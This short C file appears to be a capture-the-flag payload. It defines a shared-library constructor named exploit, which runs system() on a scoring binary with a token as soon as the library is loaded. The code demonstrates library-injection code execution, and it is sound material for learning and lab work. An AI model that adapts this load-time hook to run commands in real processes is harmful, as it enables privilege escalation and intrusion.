#include<stdio.h>
#include<stdlib.h>

static void exploit() __attribute__((constructor));

void exploit() {
    system("/usr/local/bin/score 4a0b3a0c-6593-4414-86ca-c78649e04c0f");
}
